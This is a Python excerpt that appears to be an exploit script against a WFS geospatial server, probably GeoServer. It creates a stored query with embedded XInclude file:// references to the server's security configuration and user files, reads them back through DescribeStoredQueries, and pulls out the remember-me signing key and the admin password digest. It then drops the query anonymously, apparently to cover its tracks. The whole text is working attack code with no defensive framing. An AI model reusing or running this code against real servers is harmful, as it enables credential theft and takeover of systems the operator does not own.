def disclose_secrets(http, target, data_directory, query_id):
    def include(path, mode):
        url = "file://" + urllib.parse.quote(path, safe="/:")
        return ('<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                'xmlns="" href="%s" parse="%s"/>' % (url, mode))

    base = data_directory.rstrip("/")
    query_text = escape(include(base + "/security/config.xml", "text")
                        + include(base + "/security/usergroup/default/users.xml", "xml"))
    document = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<wfs:CreateStoredQuery service="x/WFS" version="2.0.0" '
        'xmlns:wfs="http://www.opengis.net/wfs/2.0">\n'
        ' <wfs:StoredQueryDefinition id="%s">\n'
        '  <wfs:QueryExpressionText returnFeatureTypes="" '
        'language="urn:ogc:def:queryLanguage:OGC-WFS::WFSQueryExpression" isPrivate="false">\n'
        '   <wfs:Query typeNames="">%s</wfs:Query>\n'
        '  </wfs:QueryExpressionText>\n'
        ' </wfs:StoredQueryDefinition>\n'
        '</wfs:CreateStoredQuery>' % (query_id, query_text)).encode()

    created = http.post(target + "/wfs", data=document,
                        headers={"Content-Type": "application/xml"})
    if not ogc_ok(created, "CreateStoredQueryResponse"):
        raise RuntimeError("stored-query creation failed: HTTP %s %s"
                           % (created.status_code, created.text[:300]))
    described = http.get(target + "/wfs", params={
        "service": "WFS", "version": "2.0.0",
        "request": "DescribeStoredQueries", "storedQuery_id": query_id})
    if described.status_code != 200:
        raise RuntimeError("stored-query disclosure failed: HTTP %s" % described.status_code)
    root = ET.fromstring(described.content)

    key = None
    verifier = None
    for element in root.iter():
        if local_name(element.tag) == "rememberMeService":
            for child in element:
                if local_name(child.tag) == "key":
                    key = child.text or ""
        elif local_name(element.tag) == "user":
            attrs = {local_name(k): v for k, v in element.attrib.items()}
            if attrs.get("name") == ADMIN and attrs.get("enabled", "true").lower() == "true":
                verifier = attrs.get("password")
    if not key or verifier is None:
        raise RuntimeError("the remember-me key or admin digest was absent from the response")
    return key, verifier


def anonymous_drop(http, target, query_id):
    try:
        return ogc_ok(http.get(target + "/wfs", params={
            "service": "x/WFS", "version": "2.0.0",
            "request": "DropStoredQuery", "storedQuery_id": query_id}), "DropStoredQueryResponse")
    except requests.RequestException:
        return False


